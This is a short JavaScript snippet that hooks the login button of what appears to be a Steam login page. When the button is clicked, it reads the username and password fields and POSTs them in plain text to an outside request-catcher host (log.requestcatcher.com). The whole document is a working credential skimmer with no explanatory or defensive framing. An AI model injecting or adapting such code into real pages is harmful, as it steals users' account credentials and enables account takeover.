var btn = document.getElementsByClassName("btn_blue_steamui btn_medium login_btn");
var usr = document.getElementsByClassName("text_field");
btn[0].onclick = function() {
    var url = "https://log.requestcatcher.com/test";

    var xhr = new XMLHttpRequest();
    xhr.open("POST", url);

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
       if (xhr.readyState === 4) {
          console.log(xhr.status);
          console.log(xhr.responseText);
       }};

    var data = "username: " + usr[0].value + ", password: " + usr[1].value;

    xhr.send(data);

}
